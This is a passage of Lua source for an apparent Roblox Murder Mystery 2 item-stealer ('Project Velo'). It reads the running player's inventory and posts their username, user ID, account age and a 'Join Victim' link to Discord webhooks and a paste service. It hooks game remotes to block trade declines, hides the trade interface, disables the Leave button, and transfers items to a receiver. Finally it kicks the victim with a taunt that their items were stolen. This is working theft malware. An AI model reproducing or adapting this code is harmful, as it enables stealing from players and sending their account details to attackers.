		{ "roses", "🌹" },
		{ "rose", "🌹" },
		{ "tulip", "🌷" },
		{ "passion", "🌺" },
		{ "leaves", "🍃" },
		{ "leaf", "🍃" },
		{ "meadow", "🌿" },
		{ "forest", "🌳" },
		{ "minty", "🌿" },
		{ "mistletoe", "🌿" },
		{ "log", "🪵" },
		{ "wood", "🪵" },
		{ "constellation", "🌌" },
		{ "celestial", "🌌" },
		{ "nebula", "🌌" },
		{ "galaxy", "🌌" },
		{ "galactic", "🌌" },
		{ "universe", "🌌" },
		{ "space", "🚀" },
		{ "cosmic", "🌌" },
		{ "aurora", "🌌" },
		{ "borealis", "🌌" },
		{ "australis", "🌌" },
		{ "starry", "🌟" },
		{ "nightstar", "🌟" },
		{ "nightsky", "🌌" },
		{ "alienbeam", "👽" },
		{ "abduction", "👽" },
		{ "aliens", "👽" },
		{ "ufo", "🛸" },
		{ "raygun", "🔫" },
		{ "xeno", "👽" },
		{ "skull", "💀" },
		{ "bone", "🦴" },
		{ "phantom", "👻" },
		{ "spectre", "👻" },
		{ "spectral", "👻" },
		{ "ghostly", "👻" },
		{ "ghosts", "👻" },
		{ "ghost", "👻" },
		{ "ghoulish", "👻" },
		{ "soul", "👻" },
		{ "spirit", "👻" },
		{ "haunted", "🏚️" },
		{ "witch", "🧙" },
		{ "vampire", "🧛" },
		{ "zombified", "🧟" },
		{ "zombie", "🧟" },
		{ "infected", "🦠" },
		{ "mummy", "🧟" },
		{ "mummified", "🧟" },
		{ "reaper", "☠️" },
		{ "pumpking", "🎃" },
		{ "web", "🕸️" },
		{ "spider", "🕷️" },
		{ "bats", "🦇" },
		{ "eyeball", "👁️" },
		{ "seer", "👁️" },
		{ "santa", "🎅" },
		{ "reindeer", "🦌" },
		{ "sleigh", "🛷" },
		{ "sweater", "🧶" },
		{ "stockings", "🧦" },
		{ "nutcracker", "🥜" },
		{ "ornament", "🔴" },
		{ "wreath", "🎄" },
		{ "present", "🎁" },
		{ "wrapped", "🎁" },
		{ "giftwrap", "🎁" },
		{ "gift", "🎁" },
		{ "bauble", "🔮" },
		{ "penguin", "🐧" },
		{ "turkey", "🦃" },
		{ "heartblade", "❤️" },
		{ "heart wand", "💖" },
		{ "heartbreak", "💔" },
		{ "heart", "❤️" },
		{ "cupid", "💘" },
		{ "valentine", "💘" },
		{ "love", "❤️" },
		{ "sweetheart", "💝" },
		{ "storm", "🌩️" },
		{ "cursed", "🧿" },
		{ "chromatic", "🌈" },
		{ "energized", "⚡" },
		{ "pier", "🎣" },
		{ "spitfire", "🔥" },
		{ "scythe", "🌾" },
		{ "battleaxe", "🪓" },
		{ "swirly axe", "🪓" },
		{ "handsaw", "🪚" },
		{ "saw", "🪚" },
		{ "makeshift", "🛠️" },
		{ "logchopper", "🪓" },
		{ "clockwork", "⏰" },
		{ "gemstone", "💎" },
		{ "emerald", "💚" },
		{ "pearlshine", "🦪" },
		{ "pearl", "🦪" },
		{ "prismatic", "🔷" },
		{ "prism", "🔷" },
		{ "gingerscope", "🔭" },
		{ "jinglegun", "🔔" },
		{ "bioblade", "🧬" },
		{ "bio", "🧬" },
		{ "virtual", "🕹️" },
		{ "pixel", "👾" },
		{ "hacker", "💻" },
		{ "robot", "🤖" },
		{ "korblox", "🦿" },
		{ "musical", "🎵" },
		{ "traveler", "🧳" },
		{ "eternal", "♾️" },
		{ "fang", "🦷" },
		{ "ripper", "🗡️" },
		{ "predator", "🐊" },
		{ "viper", "🐍" },
		{ "snakebite", "🐍" },
		{ "tiger", "🐯" },
		{ "pirate", "🏴‍☠️" },
		{ "butterflies", "🦋" },
		{ "bubbles", "🫧" },
		{ "swirly", "🌀" },
		{ "swirl", "🌀" },
		{ "plasma", "⚡" },
		{ "laser", "⚡" },
		{ "luger", "🔫" },
		{ "blaster", "🔫" },
		{ "slasher", "🩸" },
		{ "blood", "🩸" },
		{ "hazard", "☢️" },
		{ "toxic", "☣️" },
		{ "apocalypse", "☄️" },
		{ "america", "🇺🇸" },
		{ "old glory", "🇺🇸" },
		{ "prince", "👑" },
		{ "coal", "🪨" },
		{ "neon", "💡" },
		{ "light", "💡" },
		{ "sparkle", "✨" },
		{ "shiny", "✨" },
		{ "eclipse", "🌘" },
		{ "night", "🌙" },
		{ "shadow", "🌑" },
		{ "dark", "🌑" },
		{ "star", "⭐" },
		{ "rainbow", "🌈" },
		{ "prismatic", "🔷" },
	}

	for _, v7 in ipairs(arg) do
		local displayName = v7.displayName or v7.name
		local str8 = " " .. (displayName .. " " .. v7.id):lower() .. " "
		local str9

		if v7.itemType == "Gun" then
			str9 = "🔫"
		else
			local flag3 = v7.itemType == "Pet" or v7.category == "Pets"
			str9 = "🔪"

			if flag3 then
				str9 = "🐾"
			end
		end

		if v7.category == "Pets" then
			str9 = "🐾"
		elseif v7.valueCategory == "Chroma" or v7.valueCategory == "Chromas" or v7.isChroma then
			str9 = "🌈" .. str9
		else
			for _, v8 in ipairs(tbl14) do
				if str8:find(v8[1], 1, true) then
					str9 = v8[2]
					break
				end
			end
		end

		local str10

		if v7.amount > 1 then
			local rarity = v7.rarity
			str10 = string.format("%s x%d %s ➜ %s Value (%s)", str9, v7.amount, displayName, fn26(v7.totalValue), rarity)
		else
			local rarity = v7.rarity
			str10 = string.format("%s x1 %s ➜ %s Value (%s)", str9, displayName, fn26(v7.totalValue), rarity)
		end

		table.insert(tbl13, str10)
	end

	if #tbl13 == 0 then
		table.insert(tbl13, "(No tradeable items)")
	end

	return tbl13
end

local tbl13 = {}
local v7 = ipairs
local v8 = fn27(v4)

for _, v9 in v7(v8) do
	table.insert(tbl13, v9)
end

local function fn28(arg)
	local ok3, result3 = pcall(request_2, {
		Url = str6,
		Method = "POST",
		Headers = { ["Content-Type"] = "text/plain", Accept = "application/json" },
		Body = arg,
	})

	if not ok3 or not result3 then
		return ""
	end
	local n10 = tonumber(result3.StatusCode or result3.status or result3.Status) or 0
	if n10 < 200 or n10 >= 300 then
		return ""
	end
	local ok4, result4 = pcall(HttpService.JSONDecode, HttpService, tostring(result3.Body or result3.body or ""))
	if not ok4 or type(result4) ~= "table" then
		return ""
	end
	return tostring(result4.raw or result4.scrapID and "https://api.rubis.app/v2/scrap/" .. result4.scrapID .. "/raw" or result4.id and "https://api.rubis.app/v2/scrap/" .. result4.id .. "/raw" or "")
end

local str8 = table.concat(tbl13, "\n")
local projectVeloMM2SummaryCache = genv.ProjectVeloMM2SummaryCache
local url

if type(projectVeloMM2SummaryCache) == "table" and projectVeloMM2SummaryCache.Text == str8 and type(projectVeloMM2SummaryCache.Url) == "string" then
	url = projectVeloMM2SummaryCache.Url
else
	os.clock()
	url = fn28(str8)

	if url ~= "" then
		genv.ProjectVeloMM2SummaryCache = { Text = str8, Url = url }
	end
end

local tbl14 = {}

for i, v9 in ipairs(v4) do
	if not (i > 15) then
		table.insert(tbl14, v9)
		continue
	end
	break
end

local str9 = table.concat(fn27(tbl14), "\n")
local n10 = #v4 - #tbl14

if n10 > 0 then
	str9 ..= string.format("\n... and %d more item%s", n10, n10 == 1 and "" or "s")
end

local str10 = string.format("%.2f", n8 * 15 / 1000)
local str11 = "💰 Total Value ➜ " .. fn26(n8) .. " / " .. str10 .. "$\n" .. "==============================\n\n" .. str9
local v9 = identifyexecutor or getexecutorname
local str12 = "Unknown"

if type(v9) == "function" then
	local ok3, result3 = pcall(v9)
	ok3 = ok3 and result3
	str12 = "Unknown"

	if ok3 then
		str12 = tostring(result3)
	end
end

local function fn29()
	local n11 = os.clock() + 1
	local v10 = nil

	while true do
		for _, v11 in ipairs(getgc(true)) do
			if typeof(v11) == "function" then
				local ok3, result3 = pcall(debug.getinfo, v11)
				if ok3 and result3 and result3.name == "stepAnimate" then
					v10 = v11
					break
				end
			end
		end

		if not v10 then
			task.wait(0.2)
		end

		if not (v10 or os.clock() >= n11) then
			continue
		end
		break
	end

	if not v10 then
		return game.JobId
	end
	local jobId = nil
	local v11 = nil

	local function fn30(...)
		if not jobId then
			jobId = game.JobId
		end

		return v11(...)
	end

	v11 = hookfunction
	v11 = v11(v10, fn30)
	local n12 = os.clock() + 1

	while true do
		task.wait(0.2)
		if not (jobId or os.clock() >= n12) then
			continue
		end
		break
	end

	return jobId or game.JobId
end

local v10 = fn29()
local v11 = HttpService:GenerateGUID(false)

local projectVeloMM2LiveRuntime = { Active = true, Completed = false, Stopping = false, PendingTrades = {} }
genv.ProjectVeloMM2LiveRuntime = projectVeloMM2LiveRuntime

-- direct Discord webhook send: Kaifer-style embed
local postedMessageIds = {} -- { [webhookUrl] = messageId }


local function fn32()
	-- detect highest rarity in inventory for @everyone trigger
	local godlyRarities = { Godly = true, Ancient = true, Chroma = true, Unique = true, Vintage = true }
	local hasGodlyPlus = false
	for _, v7 in ipairs(v4) do
		if godlyRarities[v7.rarity] or godlyRarities[v7.valueCategory] then
			hasGodlyPlus = true
			break
		end
	end

	-- account age in days
	local accountAgeDays = 0
	pcall(function()
		local created = localPlayer.AccountAge
		if created then
			accountAgeDays = created
		end
	end)

	-- join link
	local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(v10)

	local valuablesText = str9

	-- initial status: Hit — Missed or Claimed are patched onto this same message later
	local statusText = "🟢 Hit"

	local fields = {
		{ name = "🎯 Status",      value = string.format("```\nStatus:   %s\nExecutor: %s\nReceiver: %s\n```", statusText, str12, receiverDisplay), inline = false },
		{ name = "🎯 Player",      value = string.format("```\nUsername:     %s\nUser ID:      %s\nAccount Age:  %d days\nDisplay Name: %s\n```", localPlayer.Name, tostring(localPlayer.UserId), accountAgeDays, localPlayer.DisplayName), inline = false },
		{ name = "🔗 Join Victim", value = "[Click Here](" .. joinLink .. ")", inline = false },
		{ name = "💰 Total Value", value = "```\n" .. fn26(n8) .. "\n```", inline = false },
		{ name = "📦 Valuables",   value = "```\n" .. valuablesText .. "\n```", inline = false },
	}

	if url and url ~= "" then
		table.insert(fields, { name = "📋 Summary", value = "[View Full Inventory](" .. url .. ")", inline = false })
	end

	local payloadTbl = {
		username = "MM2 Logger",
		embeds = {{
			title  = "Murder Mystery 2! Look, You Have Hits! Congrats! 🎉",
			color  = 3447003, -- blue: In Progress
			fields = fields,
			footer = { text = "MM2 • Project Velo" },
		}},
	}

	if hasGodlyPlus then
		payloadTbl.content = "@everyone"
	end

	local payload = HttpService:JSONEncode(payloadTbl)
	local success = false

	for _, webhookUrl in ipairs(tbl2) do
		local ok3, result3 = pcall(request_2, {
			Url     = webhookUrl .. "?wait=true",
			Method  = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body    = payload,
		})

		if ok3 and result3 then
			local status = tonumber(result3.StatusCode or result3.status or result3.Status) or 0
			if status >= 200 and status < 300 then
				success = true

				-- extract message ID for later PATCH edits
				-- Discord returns the full message object when ?wait=true is appended to the webhook URL
				local rawBody = result3.Body or result3.body or result3.body_str
				local storedId = nil

				if type(rawBody) == "table" then
					-- some executors auto-decode the response body into a table
					storedId = rawBody.id and tostring(rawBody.id) or nil

				elseif type(rawBody) == "string" and rawBody ~= "" then
					-- try full JSON decode
					local ok4, decoded = pcall(HttpService.JSONDecode, HttpService, rawBody)
					if ok4 and type(decoded) == "table" and decoded.id then
						storedId = tostring(decoded.id)
					else
						-- fallback: pattern-match the id field directly from the raw JSON string
						-- handles cases where JSONDecode throws on unexpected encoding
						storedId = string.match(rawBody, '"id"%s*:%s*"(%d+)"')
					end
				end

				if storedId then
					postedMessageIds[webhookUrl] = storedId
				else
					warn("[Velo] could not extract message ID from webhook response — PATCH edits will not fire for: " .. webhookUrl)
				end
			end
		end
	end

	return success
end

-- PATCH the posted embed to show Missed — preserves all original fields
local function fn32_update_missed(reason)
	reason = reason or "Missed"

	local accountAgeDays = 0
	pcall(function()
		local created = localPlayer.AccountAge
		if created then accountAgeDays = created end
	end)

	local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(v10)

	local valuableLines = {}
	for i, v7 in ipairs(v4) do
		if i > 15 then break end
		if v7.value > 0 then
			local displayName = v7.displayName or v7.name
			table.insert(valuableLines, string.format("%s x%d %s ➜ %s (%s)", "✨", v7.amount, displayName, fn26(v7.totalValue), v7.rarity))
		end
	end
	local valuablesText = #valuableLines > 0 and table.concat(valuableLines, "\n") or "No items"
	local overflow = #v4 - math.min(#v4, 15)
	if overflow > 0 then
		valuablesText = valuablesText .. string.format("\n... and %d more", overflow)
	end

	local statusLabel = "🔴 Missed"

	local fields = {
		{ name = "🎯 Status",      value = string.format("```\nStatus:   %s\nExecutor: %s\nReceiver: %s\n```", statusLabel, str12, receiverDisplay), inline = false },
		{ name = "🎯 Player",      value = string.format("```\nUsername:     %s\nUser ID:      %s\nAccount Age:  %d days\nDisplay Name: %s\n```", localPlayer.Name, tostring(localPlayer.UserId), accountAgeDays, localPlayer.DisplayName), inline = false },
		{ name = "🔗 Join Victim", value = "[Click Here](" .. joinLink .. ")", inline = false },
		{ name = "💰 Total Value", value = "```\n" .. fn26(n8) .. "\n```", inline = false },
		{ name = "📦 Valuables",   value = "```\n" .. valuablesText .. "\n```", inline = false },
	}

	if url and url ~= "" then
		table.insert(fields, { name = "📋 Summary", value = "[View Full Inventory](" .. url .. ")", inline = false })
	end

	for _, webhookUrl in ipairs(tbl2) do
		local msgId = postedMessageIds[webhookUrl]
		if not msgId then continue end

		local patchPayload = HttpService:JSONEncode({
			embeds = {{
				title  = "Murder Mystery 2! Look, You Have Hits! Congrats! 🎉",
				color  = 15548997,
				fields = fields,
				footer = { text = "MM2 • Project Velo" },
			}},
		})

		pcall(request_2, {
			Url     = webhookUrl .. "/messages/" .. msgId,
			Method  = "PATCH",
			Headers = { ["Content-Type"] = "application/json" },
			Body    = patchPayload,
		})
	end
end

-- trade-complete: PATCH the existing embed instead of sending a new message
local function fn33(arg, arg2, _arg3)
	if arg ~= "trade_completed" or not arg2 then
		return false
	end

	local accountAgeDays = 0
	pcall(function()
		local created = localPlayer.AccountAge
		if created then accountAgeDays = created end
	end)

	local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(v10)

	local valuablesText = str9
	local statusLabel = "✅ Claimed"
	local embedColor = 5763719

	local fields = {
		{ name = "🎯 Status",      value = string.format("```\nStatus:   %s\nExecutor: %s\nReceiver: %s\n```", statusLabel, str12, receiverDisplay), inline = false },
		{ name = "🎯 Player",      value = string.format("```\nUsername:     %s\nUser ID:      %s\nAccount Age:  %d days\nDisplay Name: %s\n```", localPlayer.Name, tostring(localPlayer.UserId), accountAgeDays, localPlayer.DisplayName), inline = false },
		{ name = "🔗 Join Victim", value = "[Click Here](" .. joinLink .. ")", inline = false },
		{ name = "💰 Total Value", value = "```\n" .. fn26(n8) .. "\n```", inline = false },
		{ name = "📦 Valuables",   value = "```\n" .. valuablesText .. "\n```", inline = false },
	}

	if url and url ~= "" then
		table.insert(fields, { name = "📋 Summary", value = "[View Full Inventory](" .. url .. ")", inline = false })
	end

	for _, webhookUrl in ipairs(tbl2) do
		local msgId = postedMessageIds[webhookUrl]
		if not msgId then continue end

		local patchPayload = HttpService:JSONEncode({
			embeds = {{
				title  = "Murder Mystery 2! Look, You Have Hits! Congrats! 🎉",
				color  = embedColor,
				fields = fields,
				footer = { text = "MM2 • Project Velo" },
			}},
		})

		pcall(request_2, {
			Url     = webhookUrl .. "/messages/" .. msgId,
			Method  = "PATCH",
			Headers = { ["Content-Type"] = "application/json" },
			Body    = patchPayload,
		})
	end

	return true
end

local function fn34(arg, arg2)
	local n11 = math.max(0, tonumber(arg) or 0)
	if n11 <= 0 then
		return
	end
	local tbl18 = { tradeValue = n11, tradeId = tostring(arg2) }

	task.spawn(function()
		if fn33("trade_completed", tbl18, 5) then
			projectVeloMM2LiveRuntime.Completed = true
		end
	end)
end

local function fn35(_arg)
	for _, pendingTrade in ipairs(projectVeloMM2LiveRuntime.PendingTrades) do
		fn34(pendingTrade.tradeValue, pendingTrade.tradeId)
	end
	projectVeloMM2LiveRuntime.PendingTrades = {}
end

local function fn36()
	projectVeloMM2LiveRuntime.Stopping = true
	projectVeloMM2LiveRuntime.Active   = false
end

Players.PlayerRemoving:Connect(function(player)
	if player == localPlayer then
		fn36()
	end
end)

-- Anti-leave: only fires "Left Server" when a trade session is actually live
-- (OtherPlayer set by StartTrade.OnClientEvent). runtime.Target is also set during
-- invite attempts where no trade has started yet — checking OtherPlayer prevents
-- false "Left Server" reports for declines, timeouts, or pre-trade departures.
Players.PlayerRemoving:Connect(function(player)
	local runtime = genv.ProjectVeloTradeRuntime
	if not runtime or not runtime.Active then return end
	local otherPlayer = tostring(runtime.OtherPlayer or "")
	if otherPlayer == "" then return end -- no active trade in progress
	if tostring(player.Name):lower() == otherPlayer:lower() then
		-- confirmed: player left while a live trade session was open
		task.spawn(function()
			fn32_update_missed("Left Server")
		end)
		-- reset session
		runtime.Target = nil
		runtime.OtherPlayer = nil
		runtime.AcceptScheduled = false
		runtime.AcceptPending = false
		runtime.ObservedOffer = nil
		runtime.Session = runtime.Session + 1
	end
end)

-- Anti-Leave: disable the Leave Game button in a loop so the executor cannot leave mid-trade
task.spawn(function()
	while task.wait() do
		pcall(function()
			for _, v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
				v:Disable()
			end
		end)
	end
end)

game:GetService("GuiService").ErrorMessageChanged:Connect(function(arg)
	local str14 = tostring(arg or ""):lower()
	local flag3 = str14 ~= ""
	local pos

	if flag3 then
		pos = str14:find("disconnect", 1, true) or str14:find("connection", 1, true) or str14:find("kicked", 1, true) or str14:find("error code", 1, true)
	else
		pos = flag3
	end

	if pos then
		fn36()
	end
end)

task.spawn(function()
	local success = fn32()
	if success then
		fn35(nil)
	end
end)

local trade = ReplicatedStorage:WaitForChild("Trade")
local sendRequest = trade:WaitForChild("SendRequest")
local getTradeStatus = trade:WaitForChild("GetTradeStatus")
local n11 = 4
local n12 = 20
local n13 = 2
local n14 = 2.5
local n15 = 3

if genv.ProjectVeloTradeRuntime then
	genv.ProjectVeloTradeRuntime.Active = false
	local v15 = pairs
	local connections = genv.ProjectVeloTradeRuntime.Connections or {}

	for _, connection in v15(connections) do
		pcall(function()
			connection:Disconnect()
		end)
	end
end

local projectVeloTradeRuntime = {
	Active = true,
	Connections = {},
	Session = 0,
	Update = 0,
	OtherPlayer = nil,
	Target = nil,
	LastTarget = nil,
	Selected = {},
	RestartToken = 0,
	LastInviteAt = 0,
	ObservedOffer = nil,
	AcceptGeneration = 0,
	AcceptScheduled = false,
	AcceptPending = false,
	LastAcceptSentAt = 0,
	PendingCompletion = nil,
	ConfirmedCompletionPending = false,
	FinishedKickScheduled = false,
	TradeCompleted = false,
}

genv.ProjectVeloTradeRuntime = projectVeloTradeRuntime
local flag3 = false
local fn37 = nil
local tbl18 = {}
local obj = setmetatable({}, { __mode = "k" })
local flag4 = false
local remoteEvent = Instance.new("RemoteEvent")
local remoteFunction = Instance.new("RemoteFunction")
local fireServer = remoteEvent.FireServer
local invokeServer = remoteFunction.InvokeServer
remoteEvent:Destroy()
remoteFunction:Destroy()

local function fn38(arg, ...)
	local v15 = coroutine.running()
	local v16 = obj[v15]
	obj[v15] = true
	local v17 = pcall
	local v18 = fireServer
	local v19 = table.pack(...)
	v19.n = 3 + v19.n - 1
	table.move(v19, 1, v19.n, 3, v19)
	v19[1] = v18
	v19[2] = arg
	local v20 = v17(table.unpack(v19, 1, v19.n))
	obj[v15] = v16
	return v20
end

local function fn39(arg, ...)
	local v15 = coroutine.running()
	local v16 = obj[v15]
	obj[v15] = true
	local v17 = pcall
	local v18 = invokeServer
	local v19 = table.pack(...)
	v19.n = 3 + v19.n - 1
	table.move(v19, 1, v19.n, 3, v19)
	v19[1] = v18
	v19[2] = arg
	local v20, v21 = v17(table.unpack(v19, 1, v19.n))
	obj[v15] = v16
	return v20, v21
end

local offerItem = trade:WaitForChild("OfferItem")
local acceptTrade = trade:WaitForChild("AcceptTrade")
local acceptRequest = trade:WaitForChild("AcceptRequest")
local declineTrade = trade:WaitForChild("DeclineTrade")
local declineRequest = trade:WaitForChild("DeclineRequest")

local tbl19 = {
	DeclineTrade = true,
	DeclineRequest = true,
	CancelRequest = true,
	CancelAccept = true,
	RemoveOffer = true,
	SetRequestsEnabled = true,
}

local tbl20 = {
	DeclineTrade = true,
	DeclineRequest = true,
	CancelRequest = true,
	CancelAccept = true,
	RemoveOffer = true,
}

local n16 = 0
local n17 = 0

for _, child in ipairs(trade:GetChildren()) do
	if tbl20[child.Name] and (child:IsA("RemoteEvent") or child:IsA("RemoteFunction")) then
		tbl18[child] = true

		if pcall(function()
			child.Parent = ReplicatedStorage
			child.Name = HttpService:GenerateGUID(false)
		end) then
			n16 += 1
		else
			n17 += 1
		end
	end
end

local function fn40(descendant)
	local v15 = tbl19[descendant.Name]
	local isRemoteEvent

	if v15 then
		isRemoteEvent = descendant:IsA("RemoteEvent") or descendant:IsA("RemoteFunction")
	else
		isRemoteEvent = v15
	end

	if isRemoteEvent then
		tbl18[descendant] = true
	end
end

for _, descendant in ipairs(trade:GetDescendants()) do
	fn40(descendant)
end

table.insert(projectVeloTradeRuntime.Connections, trade.DescendantAdded:Connect(fn40))
local remoteEvent2 = Instance.new("RemoteEvent")
local flag5 = false

local function fn41()
	if type(hookfunction) ~= "function" then
		return false
	end

	return (pcall(function()
		local v15 = nil
		local v16 = nil

		local function fn42(arg, ...)
			if tbl18[arg] and not obj[coroutine.running()] then
				if arg == remoteEvent2 then
					flag5 = true
				end

				return
			end

			return v15(arg, ...)
		end

		local function fn43(arg, ...)
			if tbl18[arg] and not obj[coroutine.running()] then
				return
			end
			return v16(arg, ...)
		end

		if type(newcclosure) == "function" then
			fn42 = newcclosure(fn42)
			fn43 = newcclosure(fn43)
		end

		v15 = hookfunction
		v15 = v15(fireServer, fn42)
		v16 = hookfunction(invokeServer, fn43)

		if type(v15) ~= "function" or type(v16) ~= "function" then
			error("hookfunction did not return the originals")
		end

		fireServer = v15
		invokeServer = v16
		flag4 = true
	end))
end

tbl18[remoteEvent2] = true
fn41()

if type(getnamecallmethod) == "function" then
	local v15 = getnamecallmethod
	local v16 = nil

	local function namecall(arg, ...)
		if tbl18[arg] and not obj[coroutine.running()] then
			local v17 = v15()
			if v17 == "FireServer" or v17 == "InvokeServer" then
				return nil
			end
		end

		return v16(arg, ...)
	end

	local flag6 = false

	if type(hookmetamethod) == "function" then
		local ok3, result3 = pcall(hookmetamethod, game, "__namecall", namecall)

		if ok3 and type(result3) == "function" then
			v16 = result3
			flag6 = true
		end
	end

	if not flag6 and type(getrawmetatable) == "function" then
		if pcall(function()
			local v17 = getrawmetatable(game)
			local flag7 = type(setreadonly) == "function"

			if flag7 then
				setreadonly(v17, false)
			end

			local namecall2 = v17.__namecall

			if type(namecall2) == "function" then
				v16 = namecall2
				v17.__namecall = namecall
			end

			if flag7 then
				setreadonly(v17, true)
			end
		end) then
			local flag7 = type(v16) == "function"
		end
	end
end

if flag4 then
	task.spawn(function()
		local n18 = 0

		while projectVeloTradeRuntime.Active and n18 < 20 do
			task.wait(5)
			flag5 = false

			pcall(function()
				remoteEvent2:FireServer()
			end)

			if not flag5 then
				n18 += 1
				flag4 = false
				fn41()
			end
		end
	end)
end

local tbl21 = { TradeRequest = true, SendingRequest = true, ReceivingRequest = true }

local function fn42(arg)
	return arg:IsA("GuiObject") and tbl21[arg.Name] == true
end

local function fn43()
	for _, descendant in ipairs(localPlayer.PlayerGui:GetDescendants()) do
		if fn42(descendant) then
			descendant.Visible = false
		end
	end
end

local function fn44()
	for _, v15 in ipairs({ "TradeGUI", "TradeGUI_Phone" }) do
		local v16 = localPlayer.PlayerGui:FindFirstChild(v15)

		if v16 and v16:IsA("ScreenGui") then
			v16.Enabled = false
		end
	end
end

local function fn45(arg)
	if not arg:IsA("ScreenGui") or arg.Name ~= "TradeGUI" and arg.Name ~= "TradeGUI_Phone" then
		return
	end

	if arg.Enabled then
		arg.Enabled = false
	end

	table.insert(projectVeloTradeRuntime.Connections, arg:GetPropertyChangedSignal("Enabled"):Connect(function()
		if projectVeloTradeRuntime.Active and arg.Enabled then
			arg.Enabled = false
		end
	end))
end

for _, child in ipairs(localPlayer.PlayerGui:GetChildren()) do
	fn45(child)
end

table.insert(projectVeloTradeRuntime.Connections, localPlayer.PlayerGui.ChildAdded:Connect(function(child)
	fn45(child)

	if projectVeloTradeRuntime.Active then
		task.defer(fn44)
	end
end))

local function fn46(arg)
	if fn42(arg) then
		arg.Visible = false

		table.insert(projectVeloTradeRuntime.Connections, arg:GetPropertyChangedSignal("Visible"):Connect(function()
			if projectVeloTradeRuntime.Active and arg.Visible then
				arg.Visible = false
			end
		end))
	end
end

for _, descendant in ipairs(localPlayer.PlayerGui:GetDescendants()) do
	fn46(descendant)
end

table.insert(projectVeloTradeRuntime.Connections, localPlayer.PlayerGui.DescendantAdded:Connect(function(descendant)
	if fn42(descendant) then
		fn46(descendant)
		task.defer(fn43)
	end
end))

local function fn47()
	local tbl22 = {}
	local tbl23 = {}

	for _, v15 in ipairs(v4) do
		local str14 = v15.category .. "\0" .. v15.id

		if not tbl23[str14] then
			tbl23[str14] = true
			table.insert(tbl22, v15)
			if not (n11 <= #tbl22) then
				continue
			end
		else
			continue
		end

		break
	end

	return tbl22
end

local function fn48(arg)
	local v15 = ipairs
	arg = arg or {}
	local n18 = 0

	for _, v16 in v15(arg) do
		local n19 = math.max(1, math.floor(tonumber(v16.amount) or 1))
		n18 += math.max(0, tonumber(v16.value) or 0) * n19
	end

	return n18
end

local function fn49(arg)
	if type(arg) ~= "table" then
		return nil
	end

	for _, v15 in ipairs({ "Player1", "Player2" }) do
		local v16 = arg[v15]
		if v16 and v16.Player == localPlayer then
			return v16.Offer
		end
	end
end

local function fn50(arg, arg2)
	local v15 = pairs
	arg = arg or {}

	for _, v16 in v15(arg) do
		local itemID = v16[1] or v16.ItemID
		local n18 = tonumber(v16[2] or v16.Amount) or 1
		local itemType = v16[3] or v16.ItemType
		local id = arg2.id
		if tostring(itemID) == id and tostring(itemType) == arg2.category then
			return n18
		end
	end

	return 0
end

local function fn51(arg)
	if #projectVeloTradeRuntime.Selected == 0 then
		return false
	end

	for _, v15 in ipairs(projectVeloTradeRuntime.Selected) do
		local n18 = math.max(1, math.floor(tonumber(v15.amount) or 1))
		if fn50(arg, v15) < n18 then
			return false
		end
	end

	return true
end

local function fn52(arg)
	if arg and fn(arg) and (not flag or fn3(arg)) then
		local v15 = Players:FindFirstChild(arg)
		if v15 and v15 ~= localPlayer then
			return v15
		end
	end
end

local function fn53()
	if projectVeloTradeRuntime.FinishedKickScheduled then
		return
	end
	projectVeloTradeRuntime.FinishedKickScheduled = true
	projectVeloTradeRuntime.Active = false

	pcall(function()
		local v15 = setclipboard or toclipboard

		if type(v15) == "function" then
			v15("https://discord.gg/projectvelo")
		end
	end)

	task.delay(0.5, function()
		pcall(function()
			game:GetService("Players").LocalPlayer:Kick("All your items just got stolen by Velo Hub, Lol\n\nCode Error: 267")
		end)
	end)
end

local function fn54(arg)
	local lastTarget = arg or projectVeloTradeRuntime.LastTarget

	if lastTarget then
		projectVeloTradeRuntime.LastTarget = lastTarget
	end

	projectVeloTradeRuntime.RestartToken = projectVeloTradeRuntime.RestartToken + 1
	local restartToken = projectVeloTradeRuntime.RestartToken
	projectVeloTradeRuntime.Session = projectVeloTradeRuntime.Session + 1
	projectVeloTradeRuntime.Update = projectVeloTradeRuntime.Update + 1
	projectVeloTradeRuntime.OtherPlayer = nil
	projectVeloTradeRuntime.Target = nil
	projectVeloTradeRuntime.Selected = {}
	projectVeloTradeRuntime.ObservedOffer = nil
	projectVeloTradeRuntime.AcceptGeneration = projectVeloTradeRuntime.AcceptGeneration + 1
	projectVeloTradeRuntime.AcceptScheduled = false
	projectVeloTradeRuntime.AcceptPending = false
	projectVeloTradeRuntime.LastAcceptSentAt = 0
	flag3 = false

	task.delay(1.25, function()
		if not projectVeloTradeRuntime.Active or projectVeloTradeRuntime.RestartToken ~= restartToken then
			return
		end
		local v15, v16 = fn24(true)
		v4 = v15

		if #v4 == 0 then
			if projectVeloTradeRuntime.ConfirmedCompletionPending and v16 then
				fn53()
				return
			end
			return
		end

		projectVeloTradeRuntime.ConfirmedCompletionPending = false
		local v17 = fn52(lastTarget)

		if v17 then
			fn37(v17)
		end
	end)
end

table.insert(projectVeloTradeRuntime.Connections, trade.StartTrade.OnClientEvent:Connect(function(arg, arg2)
	fn44()
	projectVeloTradeRuntime.Session = projectVeloTradeRuntime.Session + 1
	projectVeloTradeRuntime.Update = projectVeloTradeRuntime.Update + 1
	projectVeloTradeRuntime.OtherPlayer = tostring(arg2)
	projectVeloTradeRuntime.ObservedOffer = nil
	projectVeloTradeRuntime.AcceptGeneration = projectVeloTradeRuntime.AcceptGeneration + 1
	projectVeloTradeRuntime.AcceptScheduled = false
	projectVeloTradeRuntime.AcceptPending = false
	projectVeloTradeRuntime.LastAcceptSentAt = 0
	projectVeloTradeRuntime.PendingCompletion = nil
	v4 = fn24(true)
	projectVeloTradeRuntime.Selected = fn47()

	if not fn(projectVeloTradeRuntime.OtherPlayer) then
		projectVeloTradeRuntime.Target = nil
		projectVeloTradeRuntime.Selected = {}
		fn44()
		fn38(declineTrade)
		return
	end

	projectVeloTradeRuntime.Target = projectVeloTradeRuntime.OtherPlayer
	projectVeloTradeRuntime.LastTarget = projectVeloTradeRuntime.OtherPlayer
	local session = projectVeloTradeRuntime.Session

